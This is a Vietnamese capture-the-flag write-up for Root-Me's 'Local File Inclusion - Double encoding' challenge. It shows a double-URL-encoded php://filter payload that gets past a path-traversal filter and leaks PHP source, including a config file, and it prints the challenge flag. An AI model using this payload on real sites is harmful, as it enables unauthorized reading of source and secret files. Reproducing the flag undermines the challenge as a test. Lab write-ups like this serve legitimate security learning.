---
template: overrides/blog.html
icon: material/plus-circle
title: Local File Inclusion - Double encoding
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - PHP
    - Path Traversal
---

# __Local File Inclusion - Double encoding__

<span>
:octicons-calendar-24: May 09, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch43/][http://challenge01.root-me.org/web-serveur/ch43/]

  [http://challenge01.root-me.org/web-serveur/ch43/]: http://challenge01.root-me.org/web-serveur/ch43/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy được password xác thực từ source files trên website.

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Đầu tiên ta xem xét website và thực hiện vài câu truy vấn, ta tiêm thử ../admin thì bị hệ thống phát hiện attack
<figure markdown>
  ![Image title](/rootme/web-server/php/images/local_file_inclusion_double_encoding-01.png#zoom)
  <figcaption>Hình ảnh website challenge</figcaption>
</figure>

Tới đây ta nghĩ rằng website đã filter "../", "./",... và nhiều thứ khác. Ta tiến hành dùng HTTP Encoding theo cách thông thường (. == %2E, / == %2F) thì vẫn không khả thi. Với challenge này, rootme đã cung cấp cho ta trang [owasp](https://owasp.org/www-community/Double_Encoding) này nói luôn về double encoding và cho ta mã hóa kép của "." là `%252E`; mã hóa kép của "/" là `%252F`. Tương tự:

- Kí tự : được mã thành %253A

- Kí tự - được mã thành %252D

- Kí tự = được mã thành %253D

### Bước 2: Khai thác website

Tiếp tục việc dạo quanh trên mạng, ta biết được để xem source file php ở trang home thì dùng filter bằng cú pháp `php://filter/convert.base64-encode/resource=home`

Double encoding mã trên ta được `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome`

<figure markdown>
  ![Image title](/rootme/web-server/php/images/local_file_inclusion_double_encoding-02.png#zoom)
  <figcaption>Hình ảnh mô tả việc tiêm Path vào url</figcaption>
</figure>

Ta nhận được thông điệp là một chuỗi base64, tiến hành decode bằng [Base64 decoding][https://www.base64decode.org/] ta được đoạn code php như sau

<div class="result" markdown>

``` php linenums="1" hl_lines="1"
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>
```

</div>

Ta thấy đoạn code trên có include conf.inc.php, tiến hành xem file, ta được flag

<div class="result" markdown>

``` php linenums="1" hl_lines="3"
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];
```

</div>


!!! success "__Flag__"
    Th1sIsTh3Fl4g!


[^1]: Đọc thêm tại [Local File Inclusion - Double encoding](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf?_gl=1*1t8353j*_ga*Nzc4MDU2MTY2LjE2ODI2OTQ4NDc.*_ga_SRYSKX09J7*MTY4MzU4NjE0Ni4zMi4xLjE2ODM1ODYxNDkuMC4wLjA.)